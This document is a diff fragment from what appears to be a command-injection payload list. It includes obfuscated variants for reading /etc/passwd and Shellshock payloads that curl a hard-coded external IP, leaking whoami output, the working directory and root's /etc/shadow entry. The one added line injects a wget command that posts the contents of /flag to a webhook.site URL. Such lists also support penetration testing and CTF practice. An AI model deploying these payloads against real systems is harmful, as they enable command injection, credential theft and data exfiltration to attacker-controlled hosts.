@@ -96,6 +96,7 @@ c\a\t /etc/passwd
 ca$@t /etc/passwd
 /???/c?t /etc/passwd
 /???/c?t /?tc/?as?wd
+---------"xxx; wget --post-data=$(cat /flag)  https://webhook.site/8f2fab2f-6f6c-4094-8256-28c3f0346b19"---------------
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
